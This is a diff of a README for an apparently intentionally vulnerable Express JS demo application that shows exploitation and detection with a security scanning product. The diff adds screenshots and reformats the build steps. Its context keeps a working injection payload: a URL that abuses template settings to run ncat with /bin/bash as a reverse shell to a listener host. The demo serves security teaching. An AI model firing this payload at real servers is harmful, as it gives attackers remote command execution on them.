@@ -4,11 +4,16 @@
 This a demo Express JS application to illustrate how a critical vulnerability can be exploited and how it could have been detected and remediated using [Jfrog Advanced Security](https://jfrog.com/advanced-security/) new features.
 
 
+   <img src="https://github.com/muldos/vuln-express/raw/master/images/home.png" alt="Home page overview" width="100%" style="margin: 20px;"/>
+
 ## Build the project and the docker image
 
 Build the project
+
 `npm install`
-run it locally
+
+Run it locally
+
 `npm start`
 
 Build the docker image
@@ -37,3 +42,5 @@ Note : pay attention that the netcat command may differs between the host OS & t
 `http://localhost:3000/?id=David&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27ncat%20host.docker.internal%201337%20-e%20/bin/bash%27);s`
 
 Replace `host.docker.internal` if needed, to open your remote shell where your step 1 netcat processing is listening.
+
+   <img src="https://github.com/muldos/vuln-express/raw/master/images/exploited.png" alt="Exploit overview" width="100%" style="margin: 20px;"/>
